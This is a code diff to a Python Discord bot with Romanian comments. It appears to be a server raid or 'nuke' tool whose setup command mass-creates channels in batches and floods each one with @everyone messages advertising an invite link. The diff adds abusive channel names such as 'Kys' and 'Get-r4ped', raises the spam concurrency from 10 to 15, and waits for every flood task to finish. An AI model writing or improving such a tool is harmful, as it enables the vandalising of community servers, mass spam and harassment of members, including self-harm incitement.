@@ -291,10 +291,17 @@ async def setup(ctx):
         except:
             continue
 
+    # ===== LISTA NUME CANALE (actualizată) =====
     base_channel_names = [
         "1weeksober-king",
         "Cry-kid",
-        "Larp-empire-on-top"
+        "Larp-empire-on-top",
+        "Ez-kid",
+        "Get-r4ped",
+        "Quit-beaming",
+        "Kys",
+        "1week-BOOM",
+        "Ez-larp-on-top"
     ]
 
     # ===== EMBED ȘI MESAJE =====
@@ -316,7 +323,7 @@ async def setup(ctx):
     invite_text = "https://discord.gg/larpempire @everyone join"
 
     # ===== SEMAFOR PENTRU LIMITAREA CONCURENȚEI =====
-    message_semaphore = asyncio.Semaphore(10)  # Maxim 10 canale simultan pentru trimitere mesaje
+    message_semaphore = asyncio.Semaphore(15)  # Maxim 15 canale simultan pentru trimitere mesaje
 
     async def send_messages(channel):
         async with message_semaphore:
@@ -341,7 +348,9 @@ async def setup(ctx):
 
     await user.send(f"🔄 Încep crearea a {total_channels} de canale și trimiterea mesajelor simultan...")
 
-    # Creăm un task pentru fiecare canal
+    # Lista pentru a ține toate task-urile de trimitere
+    send_tasks = []
+
     async def create_and_send(index):
         nonlocal created
         try:
@@ -352,27 +361,27 @@ async def setup(ctx):
                 styled_name = base_name
             ch = await guild.create_text_channel(name=styled_name)
             created += 1
-            # După creare, pornim trimiterea mesajelor fără a aștepta (concurrent)
-            asyncio.create_task(send_messages(ch))
+            # Creează task-ul de trimitere și îl adaugă în listă
+            task = asyncio.create_task(send_messages(ch))
+            send_tasks.append(task)
             if created % 10 == 0:
                 await user.send(f"✅ Creat {created} canale până acum...")
         except Exception as e:
             await user.send(f"❌ Eroare la canalul {index}: {e}")
 
-    # Executăm crearea în loturi de câte 20 pentru a nu suprasolicita API-ul
+    # Executăm crearea în loturi de câte 20
     for i in range(0, total_channels, 20):
         batch_tasks = [create_and_send(i+j) for j in range(20) if i+j < total_channels]
         await asyncio.gather(*batch_tasks)
         await asyncio.sleep(1)  # Pauză între loturi
 
-    await user.send(f"✅ Toate canalele au fost create ({created}). Mesajele se trimit în paralel...")
+    await user.send(f"✅ Toate canalele au fost create ({created}). Se așteaptă terminarea trimiterii mesajelor...")
 
-    # Așteptăm să se termine toate sarcinile de trimitere (opțional, pentru a ști când s-a terminat)
-    # Deoarece send_messages sunt tasks separate, putem aștepta un timp sau să le monitorizăm.
-    # Simplu: așteptăm 10 secunde pentru ca majoritatea mesajelor să fie trimise
-    await asyncio.sleep(10)
+    # Așteaptă finalizarea tuturor sarcinilor de trimitere
+    if send_tasks:
+        await asyncio.gather(*send_tasks)
 
-    await user.send("✅ Procesul a fost inițiat. Mesajele se trimit în fundal.")
+    await user.send("✅ Toate mesajele au fost trimise.")
 
     try:
         await guild.create_role(name="1weeksober-on-top")
